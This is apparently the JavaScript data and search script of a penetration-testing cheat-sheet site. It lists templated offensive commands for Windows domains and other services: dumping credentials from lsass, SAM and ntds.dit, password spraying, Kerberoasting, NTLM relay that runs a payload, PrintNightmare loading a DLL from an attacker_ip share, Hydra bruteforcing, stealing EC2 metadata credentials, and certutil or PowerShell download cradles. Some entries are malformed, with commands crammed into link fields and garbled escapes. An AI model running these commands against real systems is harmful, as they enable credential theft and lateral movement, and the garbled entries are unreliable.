var data = [
//CME
{"title":"cme - enumerate password policy","link":"/cheats/Active_directory/cme.html"},
{"title":"cme - enumerate null session","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - enumerate anonymous login","link":"/cheats/Active_directory/cme.html"},
{"title":"cme - enumerate active sessions","link":"/cheats/Active_directory/cme.html"},
{"title":"cme - enumerate domain users","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - enumerate users by bruteforce the RID","link":"/cheats/Active_directory/cme.html"},
{"title":"cme - enumerate domain groups","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - enumerate local groups","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - Enumerate permissions on all shares","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - Enumerate disks on the remote target","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - enumerate smb target not signed","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - enumerate logged users","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - enable/disable the WDigest provider and dump clear-text credentials from LSA memory","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - Can be useful after enable wdigest to force user to reconnect","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - local-auth","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - local-auth with hash","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - domain auth","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - kerberos auth","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - Dump SAM","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - Dump LSA","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - dump ntds.dit","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - dump lsass","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - dump lsass - with bloodhond update","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - password spray (user=password)","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - password spray multiple test","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - put file","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - get file","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - ASREPRoast enum without authentication","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - ASREPRoast enum with authentication","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - Kerberoasting","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - Unconstrained delegation","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - winrm-auth","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - mssql password spray","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - mssql execute query","link":"/cheats/Active_directory/cme.html   "},
{"title":"cme - mssql execute command","link":"/cheats/Active_directory/cme.html   "},

//COERCER
{"title":"coercer - list vulns","link":"/cheats/Active_directory/coercer.html   "},
{"title":"coercer - Webdav","link":"/cheats/Active_directory/coercer.html   "},
{"title":"coercer - List vulns many targets","link":"/cheats/Active_directory/coercer.html   "},


//kerberos
{"title":"Kerbrute usersenum","link":"/cheats/Active_directory/kerberos.html   "},
{"title":"kerberos enum users","link":"/cheats/Active_directory/kerberos.html  "},
{"title":"kerberos enum users (with user list)","link":"/cheats/Active_directory/kerberos.html   "},
{"title":"powershell - get user SPN","link":"/cheats/Active_directory/kerberos.html   "},
{"title":"use silver ticket","link":"/cheats/Active_directory/kerberos.html   "},
{"title":"secret dump with kerberos","link":"/cheats/Active_directory/kerberos.html   "},

//lsassy
{"title":"Lsassy basic usage with password (ip or range)","link":"/cheats/Active_directory/lsassy.html   "},
{"title":"Lsassy basic usage with hash (ip or range)","link":"/cheats/Active_directory/lsassy.html   "},
{"title":"Lsassy basic usage with kerberos (ip or range)","link":"/cheats/Active_directory/lsassy.html   "},

//mitm6
{"title":"mitm6","link":"/cheats/Active_directory/mitm6.html   "},

//responder
{"title":"responder launch","link":"/cheats/Active_directory/responder.html  "},
{"title":"responder launch - analyze mode","link":"/cheats/Active_directory/responder.html "},
{"title":"responder launch with wpad file ","link":"/cheats/Active_directory/responder.html  "},
{"title":"multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf)","link":"/cheats/Active_directory/responder.html   "},
{"title":"multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)","link":"/cheats/Active_directory/responder.html   "},
{"title":"runfinger - Responder-related utility which will finger a single IP address or an IP subnet and will reveal if a target requires SMB Signing or not.","link":"/cheats/Active_directory/responder.html   "},
{"title":"ntlmrelayx add computer","link":"/cheats/Active_directory/responder.html   "},


//rubeus
{"title":"inject ticket from file","link":"/cheats/Active_directory/cme.html   Rubeus.exe ptt /ticket:&lt;ticket&gt;"},
{"title":"ASREPRoast specific user","link":"/cheats/Active_directory/cme.html   Rubeus.exe asreproast  /user:&lt;user&gt; /domain:&lt;domain_name&gt; /format:&lt;AS_REP_response_format&gt; /outfile:&lt;output_hashes_file&gt;"},
{"title":"kerberoasting - current domain","link":"/cheats/Active_directory/cme.html   Rubeus.exe kerberoast /outfile:&lt;output_TGSs_file&gt;"},
{"title":"Kerberos get hash: Rubeus.exe hash /user:&lt;user&gt; /domain:&lt;domain_name&gt; /password:&lt;password&gt;"},

//LAPS
{"title":"get laps passwords","link":"/cheats/Active_directory/cme.html   Get-LAPSPasswords -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\&lt;login&gt; | Format-Table -AutoSize"},

//Printerbug and Petitpotam
{"title":"Finding Spooler services listening","link":"/cheats/Active_directory/cme.html   rpcdump.py &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;dc&gt; | grep MS-RPRN"},
{"title":"Finding Spooler services anonymous","link":"/cheats/Active_directory/cme.html   rpcdump.py &lt;dc&gt; | grep -A 6 MS-RPRN"},
{"title":"printerbug","link":"/cheats/Active_directory/cme.html   printerbug.py '&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;'@&lt;ip&gt; &lt;attacker_ip&gt;"},
{"title":"webclientservicescanner","link":"/cheats/Active_directory/cme.html   webclientservicescanner '&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;'@&lt;ip_range&gt;"},
{"title":"PetitPotam","link":"/cheats/Active_directory/cme.html   PetitPotam.py -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; &lt;listener&gt; &lt;target&gt;"},
{"title":"PrintNightmare: CVE-2021-1675.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target_ip&gt; '\\&lt;attacker_ip&gt;\&lt;share_name&gt;\&lt;dll_name|inject&gt;.dll'"},
{"title":"Printspoofer privesc: PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss &lt;launch_cmd&gt;"},

//scshell
{"title":"stealty psexec","link":"/cheats/Active_directory/cme.html   python3 scshell.py -service-name &lt;service-name|defragsvc&gt; -hashes :&lt;ntlm-hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;"},

//rpcclient
{"title":"rpcclient - enumdomusers: rpcclient &lt;ip&gt; -U &quot;&lt;user&gt;%&lt;password&gt;&quot; -c &quot;enumdomusers;quit&quot;"},
{"title":"rpcclient - srvinfo: rpcclient &lt;ip&gt; -U &quot;&lt;user&gt;%&lt;password&gt;&quot; -c &quot;srvinfo;quit&quot;"},

//certipy
{"title":"certipy - list certificate templates: certipy find &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;dc-ip&gt; "},
{"title":"certipy - request certificate: certipy req &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;ca-ip&gt; -template &lt;template&gt; -ca &lt;certificate-authority&gt;"},


//IMPACKET
{"title":"lookupsid - SID User Enumeration,  extract the information about what users exist and their data","link":"/cheats/Active_directory/cme.html   lookupsid.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt;"},
{"title":"reg - query registry info remotely","link":"/cheats/Active_directory/cme.html   reg.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt; query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s"},
{"title":"rpcdump - list rpc endpoint","link":"/cheats/Active_directory/cme.html   rpcdump.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt;"},
{"title":"services.py - (start, stop, delete, read status, config, list, create and change any service) remote","link":"/cheats/Active_directory/cme.html   services.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt; &lt;action&gt;"},
{"title":"getarch - find target architecture (64 or 32 bits)","link":"/cheats/Active_directory/cme.html   getArch.py -target &lt;ip&gt;"},
{"title":"netview - enumeration tool (ip/shares/sessions/logged users) - need dns set","link":"/cheats/Active_directory/cme.html   netview.py &lt;domain&gt;/&gt;user&gt; -target &lt;ip&gt; -users &lt;users_file&gt;"},
{"title":"smbclient - connect to smb on the target: smbclient.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;"},
{"title":"GetNPUsers without password to get TGT (ASREPRoasting): GetNPUsers.py &lt;domain&gt;/&lt;user&gt; -no-pass -request -format hashcat"},
{"title":"GetNPUsers - (ASREPRoasting): GetNPUsers.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/ -usersfile &lt;users_file&gt; -format hashcat"},
{"title":"GetUSERSPN","link":"/cheats/Active_directory/cme.html   GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;"},
{"title":"GetADUser -","link":"/cheats/Active_directory/cme.html   GetADUsers.py -all &lt;domain&gt;/&lt;user&gt;:&lt;password&gt; -dc-ip &lt;dc_ip&gt;"},
{"title":"PSEXEC with username: psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;"},
{"title":"PSEXEC with pass the Hash (pth): psexec.py -hashes &lt;hash&gt; &lt;user&gt;@&lt;ip&gt;"},
{"title":"PSEXEC with kerberos: export KRB5CCNAME=&lt;ccache_file&gt;; psexec.py -dc-ip &lt;dc_ip&gt; -target-ip &lt;ip&gt;&gt; -no-pass -k &lt;domain&gt;/&lt;user&gt;@&lt;target_name&gt;"},
{"title":"SMBEXEC with username: smbexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;"},
{"title":"SMBEXEC with pass the Hash (pth): smbexec.py -hashes &lt;hash&gt; &lt;user&gt;@&lt;ip&gt;"},
{"title":"wmiexec :wmiexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;"},
{"title":"wmiexec  with pass the hash (pth): wmiexec.py -hashes &lt;hash&gt; &lt;user&gt;@&lt;ip&gt;"},
{"title":"smbserver - share smb folder: smbserver.py &lt;shareName&gt; &lt;sharePath&gt;"},
{"title":"smbserver - share smb folder with authentication: smbserver.py -username &lt;username&gt; -password &lt;password&gt; &lt;shareName&gt; &lt;sharePath&gt;"},
{"title":"ntlmrelay: ntlmrelayx.py -tf &lt;targets_file&gt; -smb2support -e &lt;payload_file|payload.exe&gt;"},
{"title":"ntlmrelay - socks: ntlmrelayx.py -tf &lt;targets_file&gt; -socks -smb2support"},
{"title":"ntlmrelay - authenticate and dump hash: ntlmrelayx.py -tf &lt;targets_file&gt; -smb2support"},
{"title":"ntlmrelay - to use with mitm6: ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -t smb://&lt;target&gt; -l /tmp -socks -debug"},
{"title":"ntlmrelay - to use with mitm6 - delegate access: ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; -wh &lt;attacker_ip&gt; --delegate-access"},


//Bruteforce
{"title":"Hydra - ssh - userlist and password list - 22: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; ssh "},
{"title":"Hydra - ssh - user and password  - 22:hydra -l &lt;user|root&gt; -p &lt;password|root&gt; &lt;ip&gt; ssh "},
{"title":"Hydra - ftp - 21: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; ftp "},
{"title":"Hydra - smb - 445: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; smb"},
{"title":"Hydra - mysql - 3306: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; mysql"}, 
{"title":"Hydra - vnc - 5900: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; vnc "},
{"title":"Hydra - postgres - 5432: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; postgres"},
{"title":"Hydra - telnet - 23: hydra -L &lt;userlist&gt; -P &lt;passlist&gt; &lt;ip&gt; telnet "},
{"title":"cewl - wordlist creation: cewl -w &lt;file|wordlist.txt&gt; -d &lt;deep|3&gt; -m &lt;min_word_size|5&gt; &lt;url&gt;"},
{"title":"crunch - generate wordlist hex: crunch &lt;min|2&gt; &lt;max|8&gt; 0123456789ABCDEF -o &lt;output.txt&gt;"},
{"title":"crunch - generate wordlist charset: crunch &lt;min&gt; &lt;max&gt; -f /usr/share/crunch/charset.lst &lt;charset|mixalpha-numeric&gt; -o &lt;output.txt&gt;"},

//Cloud
{"title":"SSRF in EC2 - List roles: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
{"title":"SSRF in EC2 - Dump roles: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role_name&gt;"},

//Download
{"title":"download with certutil: certutil.exe -urlcache -split -f http://&lt;server&gt;/&lt;source_file&gt; &lt;dest_file&gt;"},
{"title":"download with  certutil (2): certutil.exe -verifyctl -f -split h http://&lt;server&gt;/&lt;source_file&gt; &lt;dest_file&gt;"},
{"title":"Encode in base64 with certutil","link":"/cheats/Active_directory/cme.html   certutil -decode enc.txt &lt;file&gt;"},
{"title":"Download with powershell"},
{"title":"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile (New-Object System.Net.WebClient).DownloadFile('http://&lt;server&gt;/&lt;source_file&gt;','&lt;dest_file&gt;')"},
{"title":"python Simple HTTP server: python -m SimpleHTTPServer &lt;lport&gt;"},
{"title":"python3 Simple HTTP server: python3 -m http.server &lt;lport&gt;"},
{"title":"php Simple builtin server: php -S 0.0.0.0:&lt;lport&gt;"},

//Crontab
{"title":"List cron jobs: crontab -l"},
{"title":"Edit cron job: crontab -e"},

]


//O trecho de código acima corresponde a uma função que é executada quando o usuário digita algo no campo de busca. A função começa por definir duas variáveis, count e t0 e t1, para armazenar os resultados da pesquisa. A variável count é usada para contar o número de resultados encontrados. As variáveis t0 e t1 são usadas para medir o tempo de processamento da pesquisa. Em seguida, é criado um regex para procurar o termo de pesquisa nos dados. Depois disso, é percorrido cada item de dados e procurado os termos de pesquisa. Se achado, o item é adicionado ao array de resultados. Por fim, o resultado é mostrado na tela junto com o número de itens encontrados e o tempo de processamento da pesquisa.

var count = 0;
var t0 = t1 = 0;

$('#txt-search').keyup(function() {
    var cresult = [];
    t0 = performance.now();
    var searchField = $(this).val();
    if (searchField === '') {
        $('#filter-records').html('');
        return;
    }
    
    var regex = new RegExp(searchField, "i");
    var output = '<div class="row grid divide-y divide-gray-500">';
    $.each(data, function(key, val) {
        if ((val.title.search(regex) != -1) || (val.link.search(regex) != -1)) {
            output += `<div class="row antialiased p-2">
          <a ${val.link} target="_blank" rel="noopener nofollow noreferrer"> ✍️ ${val.title}</a>
                      </div>`
            cresult.push({
                title: `${val.title}`,
                link: `${val.link}`
            })
            count++;
        }
    });
    output += `</div>`

    $('#filter-records').html(output);
    t1 = performance.now();
    $("#filter-records").prepend(`<div class="text-bold text-center mb-8">Found <code>${cresult.length}</code> resources related to <b>${removeTags(searchField)}</b> in <code>${t1-t0} ms</code></div>`);
});

// hashtag clicks 
//O trecho de código acima trata de um evento de clique, onde quando o elemento com a classe .searchfilter for clicado, é executada a função search(), que verifica se o conteúdo do elemento contém o valor passado como parâmetro no elemento. Se o resultado for positivo, é adicionado um elemento com um link e o título ao elemento #filter-records.
//Também é feita uma função que remove os banners presentes na página, outra para verificar parâmetros da url, uma função para converter o resultado em um objeto json e outra para sanitizar o html.

$('.searchfilter').click(function() {
    output = search($(this).val());
    $("#filter-records").html(output)
})

function search(filter) {
    var regex = new RegExp(filter, "i");
    var output = '<div class="row grid divide-y divide-gray-500">';
    $.each(data, function(key, val) {
        if ((val.title.search(regex) != -1) || (val.link.search(regex) != -1)) {
            output += `<div class="row antialiased p-2">
  <a href=${val.link} target="_blank" rel="noopener nofollow noreferrer">
✍️ ${val.title}</a>
              </div>`
        }
    });
    return output;
}

// remove banner

function Remove(el) {
    var element = el;
    element.remove();
}

// query url param

query = new URLSearchParams(window.location.search);
param = query.get('q');
if(param.length>1) {
  output = search(param)
  $("#filter-records").html(output)
  $("#filter-records").prepend(`<div class="text-bold text-center mb-8">Showing resources related to <b>${removeTags(param)}</b></div>`);
}

// json
function jsonify(filter) {
    var regex = new RegExp(filter, "i");
    var res = []
    $.each(data, function(key, val) {
        if ((val.title.search(regex) != -1) || (val.link.search(regex) != -1)) {
          res.push({
                title: `${val.title}`,
                link: `${val.link}`
            })
     
        } })
    return res;
}

// JSON 
 function downloadObjectAsJson(filter){
    if($('#txt-search').val().length > 0) {
        var exportData = jsonify($('#txt-search').val())
        var dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(exportData));
        var downloadAnchorNode = document.createElement('a');
        downloadAnchorNode.setAttribute("href",     dataStr);
        downloadAnchorNode.setAttribute("download", `${$('#txt-search').val()}.json` );
        document.body.appendChild(downloadAnchorNode); // required for firefox
        downloadAnchorNode.click();
        downloadAnchorNode.remove();
    }
  }
  
 
 // Sanitize Html
 
var tagBody = '(?:[^"\'>]|"[^"]*"|\'[^\']*\')*';

var tagOrComment = new RegExp(
    '<(?:'
    // Comment body.
    + '!--(?:(?:-*[^->])*--+|-?)'
    // Special "raw text" elements whose content should be elided.
    + '|script\\b' + tagBody + '>[\\s\\S]*?</script\\s*'
    + '|style\\b' + tagBody + '>[\\s\\S]*?</style\\s*'
    // Regular name
    + '|/?[a-z]'
    + tagBody
    + ')>',
    'gi');
    
function removeTags(html) {
  var oldHtml;
  do {
    oldHtml = html;
    html = html.replace(tagOrComment, '');
  } while (html !== oldHtml);
  return html.replace(/</g, '&lt;');
};
